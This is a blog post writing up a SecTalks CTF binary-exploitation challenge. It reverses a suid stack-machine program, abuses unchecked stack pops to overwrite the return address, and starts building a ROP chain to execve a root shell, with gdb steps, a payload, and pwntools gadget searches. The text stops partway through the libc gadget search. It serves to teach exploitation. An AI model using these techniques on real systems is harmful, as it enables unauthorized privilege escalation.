<!doctype html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>SecTalks CTF: ROP + ASLR = 500¥</title>
		<meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
		<link rel="alternate" href="/feed/feed.json" type="application/json" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
		
		<style>/**
 * okaidia theme for JavaScript, CSS and HTML
 * Loosely based on Monokai textmate theme by http://www.monokai.nl/
 * @author ocodia
 */

code[class*="language-"],
pre[class*="language-"] {
	color: #f8f8f2;
	background: none;
	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
	font-size: 1em;
	text-align: left;
	white-space: pre;
	word-spacing: normal;
	word-break: normal;
	word-wrap: normal;
	line-height: 1.5;

	-moz-tab-size: 4;
	-o-tab-size: 4;
	tab-size: 4;

	-webkit-hyphens: none;
	-moz-hyphens: none;
	-ms-hyphens: none;
	hyphens: none;
}

/* Code blocks */
pre[class*="language-"] {
	padding: 1em;
	margin: .5em 0;
	overflow: auto;
	border-radius: 0.3em;
}

:not(pre) > code[class*="language-"],
pre[class*="language-"] {
	background: #272822;
}

/* Inline code */
:not(pre) > code[class*="language-"] {
	padding: .1em;
	border-radius: .3em;
	white-space: normal;
}

.token.comment,
.token.prolog,
.token.doctype,
.token.cdata {
	color: #8292a2;
}

.token.punctuation {
	color: #f8f8f2;
}

.token.namespace {
	opacity: .7;
}

.token.property,
.token.tag,
.token.constant,
.token.symbol,
.token.deleted {
	color: #f92672;
}

.token.boolean,
.token.number {
	color: #ae81ff;
}

.token.selector,
.token.attr-name,
.token.string,
.token.char,
.token.builtin,
.token.inserted {
	color: #a6e22e;
}

.token.operator,
.token.entity,
.token.url,
.language-css .token.string,
.style .token.string,
.token.variable {
	color: #f8f8f2;
}

.token.atrule,
.token.attr-value,
.token.function,
.token.class-name {
	color: #e6db74;
}

.token.keyword {
	color: #66d9ef;
}

.token.regex,
.token.important {
	color: #fd971f;
}

.token.important,
.token.bold {
	font-weight: bold;
}
.token.italic {
	font-style: italic;
}

.token.entity {
	cursor: help;
}
/*
 * New diff- syntax
 */

pre[class*="language-diff-"] {
	--eleventy-code-padding: 1.25em;
	padding-left: var(--eleventy-code-padding);
	padding-right: var(--eleventy-code-padding);
}
.token.deleted {
	background-color: hsl(0, 51%, 37%);
	color: inherit;
}
.token.inserted {
	background-color: hsl(126, 31%, 39%);
	color: inherit;
}

/* Make the + and - characters unselectable for copy/paste */
.token.prefix.unchanged,
.token.prefix.inserted,
.token.prefix.deleted {
	-webkit-user-select: none;
	user-select: none;
	display: inline-flex;
	align-items: center;
	justify-content: center;
	padding-top: 2px;
	padding-bottom: 2px;
}
.token.prefix.inserted,
.token.prefix.deleted {
	width: var(--eleventy-code-padding);
	background-color: rgba(0,0,0,.2);
}

/* Optional: full-width background color */
.token.inserted:not(.prefix),
.token.deleted:not(.prefix) {
	display: block;
	margin-left: calc(-1 * var(--eleventy-code-padding));
	margin-right: calc(-1 * var(--eleventy-code-padding));
	text-decoration: none; /* override del, ins, mark defaults */
	color: inherit; /* override del, ins, mark defaults */
}
* { box-sizing: border-box; }
/* Defaults */
:root {
	--font-family: -apple-system, system-ui, sans-serif;
	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
}

/* Theme colors */
:root {
	--color-gray-20: #e0e0e0;
	--color-gray-50: #C0C0C0;
	--color-gray-90: #333;

	--background-color: #fff;

	--text-color: var(--color-gray-90);
	--text-color-link: #082840;
	--text-color-link-active: #5f2b48;
	--text-color-link-visited: #17050F;

	--syntax-tab-size: 2;

	--pinyin-font: 'Arima Madurai';
}

@media (prefers-color-scheme: dark) {
	:root {
		--color-gray-20: #e0e0e0;
		--color-gray-50: #C0C0C0;
		--color-gray-90: #dad8d8;

		/* --text-color is assigned to --color-gray-_ above */
		--text-color-link: #1493fb;
		--text-color-link-active: #6969f7;
		--text-color-link-visited: #a6a6f8;

		--background-color: #15202b;
	}
}


/* Global stylesheet */
* {
	box-sizing: border-box;
}

html,
body {
	padding: 0;
	margin: 0 auto;
	font-family: var(--font-family);
	color: var(--text-color);
	background-color: var(--background-color);
}
html {
	overflow-y: scroll;
}
body {
	max-width: 55em;
}

/* https://www.a11yproject.com/posts/how-to-hide-content/ */
.visually-hidden {
	clip: rect(0 0 0 0);
	clip-path: inset(50%);
	height: 1px;
	overflow: hidden;
	position: absolute;
	white-space: nowrap;
	width: 1px;
}

p:last-child {
	margin-bottom: 0;
}
p {
	line-height: 1.5;
}

li {
	line-height: 1.5;
}

a[href] {
	color: var(--text-color-link);
}
a[href]:visited {
	color: var(--text-color-link-visited);
}
a[href]:hover,
a[href]:active {
	color: var(--text-color-link-active);
}

main {
	padding: 1rem;
}
main :first-child {
	margin-top: 0;
}

header {
	border-bottom: 1px dashed var(--color-gray-20);
}
header:after {
	content: "";
	display: table;
	clear: both;
}

.links-nextprev {
	list-style: none;
	border-top: 1px dashed var(--color-gray-20);
	padding: 1em 0;
}

table {
	margin: 1em 0;
}
table td,
table th {
	padding-right: 1em;
}

pre,
code {
	font-family: var(--font-family-monospace);
}
pre:not([class*="language-"]) {
	margin: .5em 0;
	line-height: 1.375; /* 22px /16 */
	-moz-tab-size: var(--syntax-tab-size);
	-o-tab-size: var(--syntax-tab-size);
	tab-size: var(--syntax-tab-size);
	-webkit-hyphens: none;
	-ms-hyphens: none;
	hyphens: none;
	direction: ltr;
	text-align: left;
	white-space: pre;
	word-spacing: normal;
	word-break: normal;
}
code {
	word-break: break-all;
}
p > code {
	color: #722;
	text-decoration: underline #7222;
}

/* Header */
header {
	display: flex;
	gap: 1em .5em;
	flex-wrap: wrap;
	align-items: center;
	padding: 1em;
}
.home-link {
	font-size: 1em; /* 16px /16 */
	font-weight: 700;
	margin-right: 2em;
}
.home-link:link:not(:hover) {
	text-decoration: none;
}

/* Nav */
.nav {
	display: flex;
	padding: 0;
	margin: 0;
	list-style: none;
}
.nav-item {
	display: inline-block;
	margin-right: 1em;
}
.nav-item a[href]:not(:hover) {
	text-decoration: none;
}
.nav a[href][aria-current="page"] {
	text-decoration: underline;
}

/* Posts list */
.postlist {
	list-style: none;
	padding: 0;
	padding-left: 1.5rem;
}
.postlist-item {
	display: flex;
	flex-wrap: wrap;
	align-items: baseline;
	counter-increment: start-from -1;
	margin-bottom: 1em;
}
.postlist-item:before {
	display: inline-block;
	pointer-events: none;
	content: "" counter(start-from, decimal-leading-zero) ". ";
	line-height: 100%;
	text-align: right;
	margin-left: -1.5rem;
}
.postlist-date,
.postlist-item:before {
	font-size: 0.8125em; /* 13px /16 */
	color: var(--color-gray-90);
}
.postlist-date {
	word-spacing: -0.5px;
}
.postlist-link {
	font-size: 1.1875em; /* 19px /16 */
	font-weight: 700;
	flex-basis: calc(100% - 1.5rem);
	padding-left: .25em;
	padding-right: .5em;
	text-underline-position: from-font;
	text-underline-offset: 0;
	text-decoration-thickness: 1px;
}
.postlist-item-active .postlist-link {
	font-weight: bold;
}

/* Tags */
.post-tag {
	display: inline-flex;
	align-items: center;
	justify-content: center;
	text-transform: capitalize;
	font-style: italic;
}
.postlist-item > .post-tag {
	align-self: center;
}

/* Tags list */
.post-metadata {
	display: inline-flex;
	flex-wrap: wrap;
	gap: .5em;
	list-style: none;
	padding: 0;
	margin: 0;
}
.post-metadata time {
	margin-right: 1em;
}

/* Direct Links / Markdown Headers */
.header-anchor {
	text-decoration: none;
	font-style: normal;
	font-size: 1em;
	margin-left: .1em;
}
a[href].header-anchor,
a[href].header-anchor:visited {
	color: transparent;
}
a[href].header-anchor:focus,
a[href].header-anchor:hover {
	text-decoration: underline;
}
a[href].header-anchor:focus,
:hover > a[href].header-anchor {
	color: #aaa;
}

h2 + .header-anchor {
	font-size: 1.5em;
}

.pyin {
	font-family: var(--pinyin-font), cursive;
}

figure {
	margin: -1.7em 0 0.7em 0;
}

figcaption {
	font-style: italic;
}

figure img {
	border: 1px solid #ccc;
}</style>
		<link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700" rel="stylesheet" referrerpolicy="no-referrer">
	</head>
	<body>
		<a href="#skip" class="visually-hidden">Skip to main content</a>

		<header>
			<a href="/" class="home-link">ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ</a>
			<nav>
				<h2 class="visually-hidden">Top level navigation menu</h2>
				<ul class="nav">
					<li class="nav-item"><a href="/">Home</a></li>
					<li class="nav-item"><a href="/blog/">Archive</a></li>
					<li class="nav-item"><a href="/about/">About Me</a></li>
				</ul>
			</nav>
		</header>

		<main id="skip">
			
<h1>SecTalks CTF: ROP + ASLR = 500¥</h1>

<ul class="post-metadata">
	<li><time datetime="2020-03-13">2020年03月</time></li>
	<li><a href="/tags/security/" class="post-tag">security</a>, </li>
	<li><a href="/tags/ctf/" class="post-tag">ctf</a></li>
</ul>

<p>This is a write-up for a difficult Sectalks CTF challenge set by tamas which took me many hours to solve.</p>
<p>‌<figure><picture><source type="image/avif" srcset="/img/fWL6VMTqnV-380.avif 380w"><source type="image/webp" srcset="/img/fWL6VMTqnV-380.webp 380w"><img alt="Solved" loading="lazy" decoding="async" src="/img/fWL6VMTqnV-380.png" width="380" height="150"></picture><figcaption>Solved</figcaption></figure></p>
<h2 id="what-you-see" tabindex="-1">What you see <a class="header-anchor" href="#what-you-see">#</a></h2>
<p>In the challenge directory we have:</p>
<ul>
<li><code>flag</code>: the objective, readable only by root</li>
<li><code>main</code>: a 64-bit suid executable binary owned by root <code>ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, not stripped</code></li>
<li><code>code.bin</code>: writeable file read by the binary</li>
</ul>
<p>Running the executable prints out some lines of 8-byte hex strings.</p>
<p>Since the executable has the suid bit set, it runs as root even when invoked by non-root users. We can't directly read <code>flag</code> ourselves, so we need to find a vulnerability that lets us trick the executable into reading it for us as root, or even better, giving us a shell.</p>
<h2 id="environment" tabindex="-1">Environment <a class="header-anchor" href="#environment">#</a></h2>
<p>To follow along:</p>
<ul>
<li>install <code>gdb</code> and the plugin <code>gef</code></li>
<li>temporarily turn off ASLR <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></li>
<li>install <code>pwntools</code> with <code>pip</code></li>
</ul>
<h2 id="reverse-engineering" tabindex="-1">Reverse Engineering <a class="header-anchor" href="#reverse-engineering">#</a></h2>
<p>Here I describe basic operation of the executable by chucking it into Ghidra.</p>
<p>All of the meat is in function <code>sub</code>. The <code>code.bin</code> file is read into <code>buf</code> and then processed.
The <code>code.bin</code> file contains instructions for operating a stack-machine.
The first byte of each instruction determines the opcode.
I went through each branch to try to define the instructions. See the python code for more. Below is the annotated ghidra disassembly for some of the instructions.</p>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">do</span> <span class="token punctuation">{</span>
  <span class="token keyword">switch</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Process opcode</span>
    <span class="token keyword">case</span> <span class="token char">'\0'</span><span class="token operator">:</span>  <span class="token comment">// die()</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token char">'\x01'</span><span class="token operator">:</span>  <span class="token comment">// pop_to_nth_global(uint8 n)</span>
      lVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>spos<span class="token punctuation">;</span>
      spos <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// Pop stack (increment stack pointer)</span>
      globals<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span>lVar2<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// Set nth global to popped value</span>
      pos <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// Increment pos since this opcode has a 1-byte argument</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token char">'\x02'</span><span class="token operator">:</span>  <span class="token comment">// push_nth_global(uint8 n)</span>
      spos <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// Push to stack (decrement stack pointer)</span>
      stack<span class="token punctuation">[</span>spos<span class="token punctuation">]</span> <span class="token operator">=</span> globals<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// Set top of stack to nth global</span>
      pos <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    <span class="token keyword">case</span> <span class="token char">'\x05'</span><span class="token operator">:</span>  <span class="token comment">// push_uint64(uint64 i)</span>
      spos <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      stack<span class="token punctuation">[</span>spos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Read uint64_t and push to stack</span>
      pos <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>  <span class="token comment">// uint64 argument had 8 bytes, so this instruction is 9 bytes long</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    <span class="token keyword">case</span> <span class="token char">'\x07'</span><span class="token operator">:</span>  <span class="token comment">// pop_add_to_top()</span>
      iVar1 <span class="token operator">=</span> spos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      lVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>spos<span class="token punctuation">;</span>
      spos <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// pop</span>
      stack<span class="token punctuation">[</span>spos<span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span>iVar1<span class="token punctuation">]</span> <span class="token operator">+</span> stack<span class="token punctuation">[</span>lVar2<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// add popped value to top of stack</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token char">'\x08'</span><span class="token operator">:</span>  <span class="token comment">// subtract_top_from_pop()</span>
      iVar1 <span class="token operator">=</span> spos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      lVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>spos<span class="token punctuation">;</span>
      spos <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// pop</span>
      stack<span class="token punctuation">[</span>spos<span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span>lVar2<span class="token punctuation">]</span> <span class="token operator">-</span> stack<span class="token punctuation">[</span>iVar1<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// top := popped - top</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    <span class="token keyword">case</span> <span class="token char">'\x0e'</span><span class="token operator">:</span>  <span class="token comment">// pop_print()</span>
      lVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>spos<span class="token punctuation">;</span>
      spos <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">//pop</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%llx\n"</span><span class="token punctuation">,</span>stack<span class="token punctuation">[</span>lVar2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// print popped uint64 value as hex</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span></code></pre>
<p>The stack-machine operates on the <code>uint64_t stack[128]</code> and has state in <code>uint64_t globals[256]</code>.</p>
<p>The first step in validating the operation of the executable is to put some of the instructions in <code>code.bin</code> and validate the output is what you'd expect. As an example, try <code>push_uint64</code>ing some values and then <code>pop_print</code>ing them.</p>
<p>Let's fire up gdb. If you use <code>gef</code> then you can enter <code>entry-break</code> which breaks at the main function.
Run <code>disas sub</code> and see the assembly instruction <code>0x0000555555555801 &lt;+1644&gt;:  jmp 0x55555555525c &lt;sub+199&gt;</code> which is the do-while loop going back to the switch statement. If you want to pause before each stack-machine instruction in <code>buf</code> is processed, use <code>break *sub+199</code>. Then:</p>
<ul>
<li><code>c</code> to continue until the next breakpoint</li>
<li><code>ni</code> to run assembly instructions one by one, but stepping over <code>call</code>s to other functions such as <code>printf</code></li>
<li><code>si</code> to run assembly instructions one by one including stepping inside other functions such as <code>printf</code></li>
</ul>
<p>We can print the stack-machine stack which is all zero due to the <code>memset</code>:</p>
<pre><code>&gt; p stack
$2 = {0x0 &lt;repeats 128 times&gt;}
</code></pre>
<p>Get familiar reading different parts of the stack-machine stack in gdb e.g. using the <code>x</code>, <code>hexdump</code> and <code>p</code> functions.</p>
<h2 id="stack-overflow" tabindex="-1">Stack overflow <a class="header-anchor" href="#stack-overflow">#</a></h2>
<p>It's not possible to overflow the <code>globals</code> array as the argument is the correct size. We are instead going to play with the stack, which looks like this when empty:</p>
<pre><code>$rsp                  $rsp+8*0x80
$rbp-0x480            $rbp-8*16     $rbp       $rbp+8                 $rbp+0x10
|||||||||...||||||||||| other stuff | old $rbp | saved return address | ...
 stack-machine stack ^
                     $rsp+8*0x7f (spos=0x7f) = $rbp-8*17
</code></pre>
<p>If designed correctly, <code>spos</code> should be clamped between 0 (meaning the stack-machine stack is full) and 0x7f=127 (meaning the stack-machine stack is empty).
However, repeated popping without pushing can cause <code>spos</code> to increase to higher addresses beyond the bottom of the stack.
If we make <code>code.bin</code> filled with <code>pop_print</code>s (<code>\x0e\x0e...</code>), we print out a load of non-zero uint64s in hex. The first value printed will be the 0 at the bottom of the stack. The 18th will be the old $rbp. The 19th will be the saved return address 0x55555822.</p>
<h2 id="babys-first-pc-overwrite" tabindex="-1">Baby's first $PC overwrite <a class="header-anchor" href="#babys-first-pc-overwrite">#</a></h2>
<p>In <code>main</code>, we ran the instruction <code>0x000055555555581d &lt;+20&gt;: call 0x555555555195 &lt;sub&gt;</code>. This pushed the address of the next instruction (0x0000555555555822) onto the stack and then moved execution to <code>sub</code>. At the end of <code>sub</code>, the <code>ret</code> instruction pops the saved return address from the stack and moves execution back into <code>main</code>.</p>
<p>Let's try to change this saved return address to point to some assembly instructions of our own.</p>
<p>First, let's just try pushing a NOP (0xa8058b90) to the stack-machine stack, popping 20 times, then pushing the address of our NOP (0x7fffffffd640). Base64 code.bin: <code>BZCLBagAAAAADg4ODg4ODg4ODg4ODg4ODg4ODg4FQNb///9/AAA=</code>.</p>
<p>Result: <code>SIGSEGV</code>. The last line in <code>dmesg</code> shows <code>segfault at 7fffffffd640 ip 00007fffffffd640 sp 00007fffffffd740 error 15</code> which means &quot;attempt to execute code from a mapped memory area that isn't executable&quot;.</p>
<p>The executable has a virtual memory mapping that specifies read-write-execute permissions for each area of memory. Unfortunately, we won't be able to write arbitrary assembly code to the stack and execute it since the stack page is marked <code>rw-</code> (read, write, no execute). We can see the layout with the gef gdb command <code>vmmap</code>.</p>
<pre><code>gef&gt; vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /blah/main
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /blah/main
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /blah/main
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /blah/main
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /blah/main
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fcb000 0x00007ffff7fce000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</code></pre>
<h2 id="rop-till-you-drop" tabindex="-1">ROP till you drop <a class="header-anchor" href="#rop-till-you-drop">#</a></h2>
<p>While we can't write our own instructions, we can point to helpful instructions already present in the executable using Return Oriented Programming (ROP). Usually this is done by piecing together &quot;gadgets&quot;. A gadget is often a <code>pop</code> instruction (which puts a value from the stack into a register) followed immediately by a <code>ret</code> instruction which jumps to the next gadget in our ROP-chain.</p>
<h3 id="rop-gadget-chain-toy-example" tabindex="-1">ROP gadget chain toy example <a class="header-anchor" href="#rop-gadget-chain-toy-example">#</a></h3>
<pre class="language-asm" tabindex="0"><code class="language-asm">0x100 pop rdi
0x108 pop rcx
0x110 ret
0x118 pop rax
0x120 mov $rsp, 0x007
0x128 ret
0x130 pop rax
0x130 pop r10
0x138 ret
0x140 syscall
0x148 push rax</code></pre>
<p>Let's say we have a binary containing the above assembly code, and our aim is to set register <code>rdi</code> to 0xDDD and register <code>rax</code> to 0xAAA before calling <code>syscall</code>. We can do this by creating a stack layout:</p>
<pre><code>0x100  # Gadget 1
0xDDD  # rdi
0x000  # rcx: can put anything here as we don't care about rcx
0x130  # Gadget 2
0xAAA  # rax
0x000  # r10: can put anything here
0x140  # Gadget 3
</code></pre>
<p>We have a gadget for setting <code>rdi</code> at 0x100. We need 2 values on the stack for the <code>rdi</code> and <code>rcx</code> registers, although we only care about setting the <code>rdi</code> value. We can't use 0x118 for setting <code>rax</code> as it will mess with the stack pointer before the <code>ret</code>, and we will lose control of execution. We don't care about the lack of <code>ret</code> after <code>syscall</code> as the <code>syscall</code> was our final objective.</p>
<h2 id="execve-me-a-shell" tabindex="-1">execve me a shell <a class="header-anchor" href="#execve-me-a-shell">#</a></h2>
<p>Our objective is to call <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve</a> and launch a shell:</p>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pathname<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  # unistd<span class="token punctuation">.</span>h


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> sh<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> sh<span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">execve</span><span class="token punctuation">(</span> sh<span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>According to the <a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">linux syscall table</a>, we need to set up our registers according to the 64-bit ABI: <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">Intel</a>. The ABI specifies which registers correspond to which arguments in the syscall.</p>
<ul>
<li>rax: 59 = 0x3B (execve)</li>
<li>rdi: <code>sh</code>: pointer to null-terminated string <code>/bin/sh\x00</code></li>
<li>rsi: <code>args</code>: pointer to array [pointer to <code>sh</code>, 0]</li>
<li>rdx: <code>envp</code>: we will get away with setting this register to zero</li>
</ul>
<p>So our desired stack should look something like (line number <code>n</code> refers to <code>$rbp+8n</code>):</p>
<pre><code>+01 0x??? address of rax gadget (saved return address)
+02 0x000000000000003B  # rax
+03 0x??? address of rdi gadget
+04 Pointer to +10
+05 0x??? address of rsi gadget
+06 Pointer to +11
+07 0x??? address of rdx gadget
+08 0x0000000000000000
+09 0x??? address of syscall
+10 0x0068732f6e69622f  # /bin/sh\x00
+11 Pointer to +10  # args[]
+12 0x0000000000000000  # NULL terminate args[]
</code></pre>
<h3 id="go-go-gadget" tabindex="-1">Go go gadget <a class="header-anchor" href="#go-go-gadget">#</a></h3>
<h4 id="main" tabindex="-1">Main <a class="header-anchor" href="#main">#</a></h4>
<p>Let's hunt for our gadgets with <code>objdump -Mintel -d main | less</code> and search <code>/pop\s+rsi</code>. We can see <code>pop rsi</code> at 0x10b5, but it isn't followed by a <code>ret</code> so is unlikely to work for us. Instructions to pop the other registers don't appear to exist at all unless we also look more carefully at the machine code. We can use <code>pwntools</code> to find such hidden gadgets e.g. searching for <code>pop rdi</code>:</p>
<pre><code>&gt;&gt;&gt; from pwn import *
&gt;&gt;&gt; rop_main = ROP(ELF(&quot;main&quot;))
[*] '/blah/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for 'main'
&gt;&gt;&gt; [g for g in rop_main.search_iter(regs=[&quot;rdi&quot;])]
[Gadget(0x188b, ['pop rdi', 'ret'], ['rdi'], 0x8)]
</code></pre>
<p>This finds a gadget at address 0x188b which will let us set the <code>rdi</code> register, and causes <code>rsp</code> to increase by 0x8 before the <code>ret</code> (one pop). Gadget 0x188b can't be seen in the <code>objdump</code> output:</p>
<pre><code>188a: 41 5f  pop    r15
188c: c3     ret
</code></pre>
<p>But <code>5f</code> is valid machine code for <code>pop rdi</code>. You can play on the <a href="https://defuse.ca/online-x86-assembler.htm">online disassembler</a>.</p>
<p>Unfortunately, we can't find anything for <code>rdx</code> or <code>rax</code>.</p>
<h4 id="libc" tabindex="-1">Libc <a class="header-anchor" href="#libc">#</a></h4>
<p>Luckily, we have linked libraries which contain a huge wealth of gadgets, such as <code>libc</code> (see the output of <code>vmmap</code> above).</p>
<pre><code>$ ldd ./main
        linux-vdso.so.1 =&gt;  (0x00007ffff7ffd000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c01000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
$ readlink -f /lib/x86_64-linux-gnu/libc.so.6
/lib/x86_64-linux-gnu/libc-2.23.so
</code></pre>
<p>The CTF environment used libc-2.28 which I downloaded from the server, but my local machine uses a very old version (2.23). The exact addresses will differ based on libc version, but you should be able to find equivalent gadgets.</p>
<pre><code>&gt;&gt;&gt; from pwn import *
